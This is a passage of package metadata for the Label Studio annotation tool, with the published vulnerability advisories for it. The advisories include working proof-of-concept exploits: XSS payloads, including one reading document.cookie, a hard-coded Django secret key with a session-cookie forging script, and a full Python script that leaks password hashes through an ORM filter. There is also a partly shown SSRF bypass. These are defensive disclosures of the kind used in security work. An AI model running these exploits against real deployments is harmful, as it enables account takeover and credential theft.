content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"1.1.0":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: Apache Software License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/1.1.0/","requires_dist":["wheel","appdirs (>=1.4.3)","attr (==0.3.1)","attrs (>=19.2.0)","pyyaml (>=5.3.1)","azure-storage-blob (>=12.6.0)","boto (==2.49.0)","boto3 (==1.16.28)","botocore (==1.19.28)","google-cloud-storage (==1.28.1)","Django (==3.1.12)","django-annoying (==0.10.6)","django-debug-toolbar (==3.2)","django-filter (==2.4.0)","django-model-utils (==4.1.1)","django-rq (==2.3.2)","django-cors-headers (==3.6.0)","django-extensions (==3.1.0)","django-rest-swagger (==2.2.0)","django-user-agents (==0.4.0)","django-ranged-fileresponse (>=0.1.2)","django-redis-cache (==3.0.0)","drf-dynamic-fields (==0.3.0)","drf-yasg (==1.20.0)","drf-generators (==0.3.0)","label-studio-converter (==0.0.29)","htmlmin (==0.1.12)","jsonschema (==3.2.0)","lockfile (>=0.12.0)","lxml (>=4.2.5)","numpy (>=1.19.1)","ordered-set (==4.0.2)","pandas (>=0.24.0)","protobuf (>=3.15.5)","psycopg2-binary (==2.8.4)","pydantic (==1.7.3)","python-dateutil (==2.8.1)","pytz (==2019.3)","requests (<3,>=2.22.0)","rq (==1.7.0)","rules (==2.2)","ujson (>=3.0.0)","xmljson (==0.2.0)","colorama (>=0.4.4)","boxing (>=0.1.4)","redis (>=3.5.0)","sentry-sdk (>=1.1.0)"],"requires_python":">=3.6","summary":"Label Studio annotation tool","version":"1.1.0","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"ace76083a7fdd47df045ee5ac6b9406deac1257654cf4028cfc3df84641e37b5","md5":"a2dbb05be0cbb354f6529fc00e3cea62","sha256":"46704a7e3c22b50291fb3e9bfbc7cb0c2d66dfb61b184a2d271dcd79ff2e7f10"},"downloads":-1,"filename":"label_studio-1.1.0-py3-none-any.whl","has_sig":false,"md5_digest":"a2dbb05be0cbb354f6529fc00e3cea62","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.6","size":48372818,"upload_time":"2021-06-30T22:54:50","upload_time_iso_8601":"2021-06-30T22:54:50.787125Z","url":"https://files.pythonhosted.org/packages/ac/e7/6083a7fdd47df045ee5ac6b9406deac1257654cf4028cfc3df84641e37b5/label_studio-1.1.0-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"a52b73203c955283176fdb4937a730def0704159731977b4d8413f621b0e1993","md5":"f20bacf32dca569181eadcb47b43127a","sha256":"0e6ab9859f9474422e6b5652d87f50bfe7777719fc042387b48cbf9aa1439505"},"downloads":-1,"filename":"label-studio-1.1.0.tar.gz","has_sig":false,"md5_digest":"f20bacf32dca569181eadcb47b43127a","packagetype":"sdist","python_version":"source","requires_python":">=3.6","size":47552950,"upload_time":"2021-06-30T22:55:06","upload_time_iso_8601":"2021-06-30T22:55:06.522456Z","url":"https://files.pythonhosted.org/packages/a5/2b/73203c955283176fdb4937a730def0704159731977b4d8413f621b0e1993/label-studio-1.1.0.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import 